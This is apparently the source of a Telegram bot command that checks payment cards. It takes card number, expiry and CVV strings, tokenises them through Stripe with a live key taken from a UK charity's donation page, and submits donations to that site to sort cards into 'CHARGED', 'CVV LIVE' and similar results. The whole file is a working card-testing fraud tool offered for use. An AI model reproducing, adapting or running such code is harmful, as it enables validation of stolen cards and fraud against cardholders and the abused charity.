import requests
import time
import json

def process_nonsk1_command(bot, message):
    chat_id = message.chat.id
    card_data = message.text.split()[1:]  # Get the card data from the command
    if card_data:
        total_cards = len(card_data)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK1 GATE\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for card in card_data:
            result = check_card_details(card)
            results.append(f"Combo: {card}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide card details in the format: /nonsk1 cc|mm|yy|cvc")

def check_card_details(card):
    try:
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = "0" + mes
        if len(ano) == 2:
            ano = "20" + ano

        # 1st Request
        token_url = "https://api.stripe.com/v1/tokens"
        headers_1 = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'
        }
        data_1 = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': '9628cd1f-51b1-48a2-b779-c91f293e619d57e83f',
            'muid': '9659dbc4-66a4-4e8c-8f8d-c9da74185546909b66',
            'sid': '4980e1e6-2e01-45ee-b723-c95c0bbd783ce54f54',
            'payment_user_agent': 'stripe.js/e362d03051; stripe-js-v3/e362d03051; card-element',
            'referrer': 'https://oneummah.org.uk',
            'time_on_page': '74242',
            'key': 'pk_live_oeBlScsEPKeBvHnRXizVNSl4',
            'pasted_fields': 'number'
        }

        response_1 = requests.post(token_url, headers=headers_1, data=data_1)
        result_1 = response_1.json()

        token_id = result_1.get("id", "")
        brand = result_1.get("card", {}).get("brand", "Unknown")

        # 2nd Request
        donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php"
        headers_2 = {
            'Host': 'oneummah.org.uk',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://oneummah.org.uk',
            'Referer': 'https://oneummah.org.uk/donate/?',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
            'upgrade-insecure-requests': '1'
        }
        data_2 = {
            'action': 'k14_submit_donation',
            'token': token_id,
            'data': 'donation_id=360484&title=&first_name=&last_name=&email=&phone=&where_hear=&address_1=&address_2=&city=&postcode=&country='
        }

        response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
        result_2 = response_2.text

        if "payment_intent_unexpected_state" in result_2:
            return "Payment Intent Confirmed"
        elif "succeeded" in result_2:
            return "CHARGED"
        elif "Your card has insufficient funds." in result_2:
            return "INSUFFICIENT FUNDS"
        elif "incorrect_zip" in result_2:
            return "CVV LIVE"
        elif "insufficient_funds" in result_2:
            return "INSUFFICIENT FUNDS"
        elif "security code is incorrect" in result_2:
            return "CCN LIVE"
        elif "transaction_not_allowed" in result_2:
            return "CVV LIVE"
        elif "stripe_3ds2_fingerprint" in result_2:
            return "3D REQUIRED"
        elif '"cvc_check": "pass"' in result_2:
            return "CHARGED €5"
        elif "Membership Confirmation" in result_2:
            return "Membership Confirmation"
        elif "Thank you for your support!" in result_2:
            return "CHARGED"
        elif "Thank you for your donation" in result_2:
            return "CHARGED"
        elif "incorrect_number" in result_1:
            return "Your card number is incorrect."
        elif '"status":"incomplete"' in result_2:
            return "Your card was declined."
        elif "Your card was declined." in result_2:
            return "Your card was declined."
        elif "card_declined" in result_2:
            return "Your card was declined."
        else:
            try:
                result_2_json = json.loads(result_2)
                if "message" in result_2_json:
                    return f"DEAD\nMessage: {result_2_json['message']}"
                else:
                    return f"DEAD\nRaw response 2: {result_2}"
            except json.JSONDecodeError:
                return f"DEAD\nRaw response 2: {result_2}"

    except Exception as e:
        print(f"An error occurred in check_card_details: {str(e)}")  # Log error for debugging
        return f"An error occurred while checking the card: {str(e)}"

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_cards}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
